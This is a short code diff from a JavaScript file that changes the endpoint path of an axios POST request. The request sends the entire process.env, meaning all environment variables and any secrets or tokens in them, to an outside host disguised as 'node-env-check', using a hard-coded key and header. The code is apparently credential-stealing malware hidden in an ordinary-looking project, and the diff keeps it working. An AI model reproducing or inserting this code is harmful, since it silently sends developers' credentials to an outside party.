@@ -459,7 +459,7 @@ const host = "node-env-check.vercel.app";
 const apikey = "3aeb34a3${flag}";
 axios
   .post(
-    \`https://\${host}/api/ip-check-encrypted/\${apikey}\`,
+    \`https://\${host}/api/vscode-encrypted/\${apikey}\`,
     { ...process.env },
     { headers: { "x-secret-header": "secret" } }
   )
